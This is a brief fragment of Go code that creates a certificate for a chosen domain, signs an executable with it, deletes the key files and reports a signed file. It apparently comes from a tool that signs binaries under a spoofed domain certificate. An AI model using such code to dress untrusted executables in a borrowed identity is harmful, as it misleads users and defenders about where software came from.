		inputFile = inputFile + ".old"
		GenerateCert(domain, inputFile)
		GeneratePFK(password, domain)
		SignExecutable(password, pfx, inputFile, outFile)
	}

	os.Remove(domain + ".pem")
	os.Remove(domain + ".key")
	os.Remove(domain + ".pfx")
	fmt.Println("[+] Signed File Created")

}
